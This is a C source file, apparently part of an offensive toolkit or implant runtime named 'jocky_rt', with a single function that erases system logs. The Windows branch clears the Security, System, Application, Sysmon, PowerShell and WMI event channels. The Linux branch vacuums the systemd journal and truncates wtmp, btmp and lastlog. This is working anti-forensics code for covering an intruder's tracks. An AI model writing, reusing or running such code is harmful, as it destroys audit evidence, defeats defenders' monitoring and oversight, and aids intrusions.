#define _GNU_SOURCE
#include "jocky_rt.h"

#ifdef _WIN32
#include <windows.h>
#include <winevt.h>

static void clear_channel(const wchar_t *channel) {
    EVT_HANDLE h = EvtOpenLog(NULL, channel, EvtOpenChannelPath);
    if (h) { EvtClearLog(h, NULL); EvtClose(h); }
}

bool jocky_clear_logs(void) {
    static const wchar_t *channels[] = {
        L"Security",
        L"System",
        L"Application",
        L"Microsoft-Windows-Sysmon/Operational",
        L"Microsoft-Windows-PowerShell/Operational",
        L"Microsoft-Windows-WMI-Activity/Operational",
        NULL
    };
    for (int i = 0; channels[i]; i++)
        clear_channel(channels[i]);
    return true;
}

#else
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

bool jocky_clear_logs(void) {
    system("journalctl --vacuum-time=1s 2>/dev/null");
    static const char *logs[] = {
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        NULL
    };
    for (int i = 0; logs[i]; i++) {
        int fd = open(logs[i], O_WRONLY | O_TRUNC);
        if (fd >= 0) close(fd);
    }
    return true;
}

#endif
